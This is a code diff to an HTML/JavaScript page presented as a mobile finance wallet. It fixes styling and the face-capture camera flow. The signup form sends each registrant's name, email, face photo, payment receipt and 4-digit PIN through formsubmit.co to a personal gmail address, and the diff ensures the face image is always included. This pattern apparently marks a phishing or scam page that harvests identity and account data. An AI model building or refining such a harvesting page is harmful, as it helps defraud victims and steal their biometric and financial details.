@@ -619,7 +619,6 @@
       padding: 25px;
       border-radius: 22px 22px 0 0;
       background: #fff;
-      margin-top: auto;
     }
 
     .modal-back {
@@ -1402,12 +1401,12 @@
     .camera-modal {
       position: fixed;
       inset: 0;
-      z-index: 15;
+      z-index: 10;
       display: none;
       align-items: center;
       justify-content: center;
       padding: 15px;
-      background: rgba(0, 0, 0, 0.9);
+      background: rgba(0, 0, 0, 0.7);
     }
 
     .camera-modal.active {
@@ -1416,7 +1415,7 @@
 
     .camera-box {
       width: 100%;
-      max-width: 500px;
+      max-width: 400px;
       background: #fff;
       border-radius: 16px;
       padding: 20px;
@@ -1436,7 +1435,7 @@
       border-radius: 12px;
       margin-bottom: 15px;
       background: #000;
-      min-height: 300px;
+      max-height: 300px;
     }
 
     .camera-canvas {
@@ -1481,8 +1480,9 @@
       margin-top: 15px;
       border-radius: 8px;
       display: none;
-      max-height: 300px;
-      object-fit: contain;
+      max-width: 200px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
     @media (max-width: 480px) {
@@ -1690,7 +1690,7 @@
     <nav class="bottom-nav">
       <button class="nav-item active"><div>●</div>Home</button>
       <button class="nav-item hidden"><div>◇</div>Rewards</button>
-      <button class="nav-item hidden"><div>▱</div>Finance</div>
+      <button class="nav-item hidden"><div>▱</div>Finance</button>
       <button class="nav-item hidden"><div>▭</div>Cards</button>
       <button class="nav-item" id="meButton"><div>●</div>Me</button>
     </nav>
@@ -2036,7 +2036,7 @@
   <div id="cameraModal" class="camera-modal">
     <div class="camera-box">
       <div class="camera-title">Capture Your Face</div>
-      <video id="cameraVideo" class="camera-video" autoplay playsinline></video>
+      <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
       <canvas id="cameraCanvas" class="camera-canvas"></canvas>
       <img id="capturedImage" class="captured-image" />
       <div class="camera-buttons">
@@ -2053,10 +2053,11 @@
 
       <form id="signupForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_subject" value="New Account Registration" />
+        <input type="hidden" name="Face Capture" id="faceData" />
 
         <div class="field">
           <label><span class="required">*</span>Full Name</label>
-          <input name="Full Name" id="signupFullName" required />
+          <input name="Full Name" type="text" required />
         </div>
 
         <div class="field">
@@ -2076,16 +2077,16 @@
 
         <div class="field">
           <label><span class="required">*</span>Face Capture</label>
-          <button class="primary-btn" id="openCameraBtn" type="button" style="background: var(--green); margin-bottom: 10px;">📷 Capture Face</button>
-          <div id="facePreview" style="display: none;">
+          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green);">📷 Capture Face</button>
+          <div id="facePreview" style="margin-top: 10px; display: none; text-align: center;">
             <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 200px;" />
-            <input type="hidden" name="Face Capture" id="faceData" />
+            <p style="font-size: 12px; color: var(--green); margin-top: 8px;">✓ Face captured successfully</p>
           </div>
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Email</label>
-          <input name="Email" type="email" id="signupEmail" required />
+          <input name="Email" type="email" required />
         </div>
 
         <div class="field">
@@ -2104,7 +2105,7 @@
         </div>
 
         <div class="field">
-          <button type="button" id="makePaymentBtn" class="primary-btn" style="background: var(--green);">Make Payment ⟩</button>
+          <button type="button" id="makePaymentBtn" class="primary-btn" style="background: var(--green); margin: 0;">Make Payment ⟩</button>
         </div>
 
         <div class="field">
@@ -2120,12 +2121,12 @@
 
         <div class="field">
           <label><span class="required">*</span>Create 4-Digit PIN</label>
-          <input name="PIN" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+          <input name="PIN" type="password" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
         </div>
 
         <div class="field">
           <label>Referral Code (Optional)</label>
-          <input name="Referral Code" />
+          <input name="Referral Code" type="text" />
         </div>
 
         <button class="primary-btn" type="submit">REGISTER</button>
@@ -2209,6 +2210,7 @@
     let pinModalCallback = null;
     let mediaStream = null;
     let currentWalletIndex = 0;
+    let faceImageData = null;
     const EXCHANGE_RATE = 1500; // 1 USD = 1500 NGN
 
     const $ = (id) => document.getElementById(id);
@@ -2917,7 +2919,6 @@
     function stopCamera() {
       if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
-        mediaStream = null;
       }
       closeModal("cameraModal");
     }
@@ -2930,18 +2931,25 @@
     $("captureBtn").addEventListener("click", () => {
       const video = $("cameraVideo");
       const canvas = $("cameraCanvas");
-      const context = canvas.getContext('2d');
       
+      if (!video.videoWidth || !video.videoHeight) {
+        showAlert("Error", "Camera not ready. Please try again.");
+        return;
+      }
+
+      const context = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
       
       const imageData = canvas.toDataURL('image/png');
+      faceImageData = imageData;
       $("faceData").value = imageData;
       $("facePreviewImg").src = imageData;
       $("facePreview").style.display = "block";
       
       stopCamera();
+      showAlert("Success", "Face captured successfully!");
     });
 
     $("cameraCloseBtn").addEventListener("click", () => {
@@ -2973,7 +2981,7 @@
     $("signupForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
-      if (!$("faceData").value) {
+      if (!faceImageData) {
         showAlert("Face Capture Required", "Please capture your face before registering.");
         return;
       }
@@ -3017,6 +3025,11 @@
     // Signup link
     $("signupLink").addEventListener("click", (event) => {
       event.preventDefault();
+      faceImageData = null;
+      $("faceData").value = "";
+      $("facePreview").style.display = "none";
+      $("receiptFileName").textContent = "";
+      $("receiptFileInput").value = "";
       showLoading();
       setTimeout(() => {
         hideLoading();
